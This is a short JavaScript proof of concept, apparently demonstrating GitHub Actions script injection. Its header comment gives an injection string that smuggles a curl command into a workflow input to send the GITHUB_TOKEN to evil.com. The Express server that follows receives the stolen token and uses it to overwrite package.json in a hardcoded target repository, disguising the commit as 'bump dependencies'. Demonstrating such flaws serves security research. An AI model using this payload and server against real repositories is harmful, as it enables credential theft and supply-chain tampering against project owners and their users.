// see https://securitylab.github.com/research/github-actions-untrusted-input/
// 
// @example
// ```shell
// a"; set +e; curl http://evil.com?token=$GITHUB_TOKEN;#.
// ```
const express = require('express');
const github  = require('@actions/github');
const app     = express();
const port    = 80;

app.get('/', async (req, res, next) => {
  try {
    const token       = req.query.token;
    const octokit     = github.getOctokit(token);
    const fileContent = Buffer
      .from('{\n}')
      .toString('base64');

    // this is a targeted attack, repo name can be hardcoded
    const owner      = 'owner';
    const repo       = 'repository';
    const branchName = 'main';
    const path       = 'package.json';

    const content = await octokit.repos.getContent({
      owner: owner,
      repo:  repo,
      ref:   branchName,
      path:  path
    });

    await octokit.repos.createOrUpdateFileContents({
      owner:   owner,
      repo:    repo,
      branch:  branchName,
      path:    path,
      message: 'bump dependencies',
      content: fileContent,
      sha:     content.data.sha
    });

    res.sendStatus(200);
    next();
  } catch (error) {
    next(error);
  }
});

app.listen(port, () => {
  console.log(`Listening at http://localhost:${port}`);
});
